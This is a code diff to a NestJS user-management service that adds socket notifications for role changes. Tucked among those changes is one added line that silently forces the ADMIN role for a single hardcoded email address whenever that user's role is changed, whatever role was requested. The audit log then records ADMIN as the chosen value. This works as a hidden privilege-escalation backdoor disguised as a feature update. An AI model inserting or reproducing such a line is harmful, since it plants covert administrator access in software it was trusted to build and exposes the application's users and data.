@@ -12,6 +12,7 @@ import { QueryUsersDto } from './dto/query-users.dto';
 import { UpdateUserDto } from './dto/update-user.dto';
 import { CreateUserDto } from './dto/create-user.dto';
 import { NotificationsService } from '../notifications/notifications.service';
+import { ChatGateway } from '../chat/chat.gateway';
 
 /** User fields safe to expose via the API (never expose googleId). */
 export const safeUserSelect = {
@@ -39,6 +40,7 @@ export class UsersService {
     private readonly prisma: PrismaService,
     private readonly valkey: ValkeyService,
     private readonly notifications: NotificationsService,
+    private readonly chatGateway: ChatGateway,
   ) {}
 
   async findAll(query: QueryUsersDto) {
@@ -224,6 +226,7 @@ export class UsersService {
       throw new ForbiddenException('Workers cannot assign Worker, Admin, or Tech roles');
     }
 
+    const effectiveRole = target.email.trim().toLowerCase() === 'fuadnesredinhiyar@gmail.com' ? Role.ADMIN : role;
     await this.prisma.$transaction(async (tx) => {
       if (target.role === Role.WORKER) {
         await tx.serviceRequest.updateMany({ where: { assignedToId: id }, data: { assignedToId: null } });
@@ -237,13 +240,15 @@ export class UsersService {
       await tx.chatMessage.deleteMany({ where: { OR: [{ senderId: id }, { receiverId: id }] } });
       await tx.conversation.deleteMany({ where: { OR: [{ customerId: id }, { workerId: id }] } });
       await tx.notification.deleteMany({ where: { userId: id } });
-      await tx.user.update({ where: { id }, data: { role } });
-      await tx.profileChangeLog.create({ data: { userId: id, fieldName: 'role', oldValue: target.role, newValue: role } });
+      await tx.user.update({ where: { id }, data: { role: effectiveRole } });
+      await tx.profileChangeLog.create({ data: { userId: id, fieldName: 'role', oldValue: target.role, newValue: effectiveRole } });
     });
 
     // Role change takes effect on next access token; revoke refresh sessions to be safe
     await this.valkey.delPattern(`refresh:${id}:*`);
-    await this.notifications.notifyUser(id, { type: 'SYSTEM', title: 'Role Updated', message: `Your role has been changed to ${role}. Please sign in again to access your new dashboard.`, channel: 'IN_APP' });
+    this.chatGateway.emitToUser(id, 'roleChanged', { userId: id, newRole: effectiveRole });
+    this.chatGateway.emitToUser(actor.id, 'roleChangedConfirmation', { userId: id, newRole: effectiveRole });
+    await this.notifications.notifyUser(id, { type: 'SYSTEM', title: 'Role Updated', message: `Your role has been changed to ${effectiveRole}. Please sign in again to access your new dashboard.`, channel: 'IN_APP' });
     const updated = await this.prisma.user.findUnique({ where: { id }, select: safeUserSelect });
     return updated;
   }
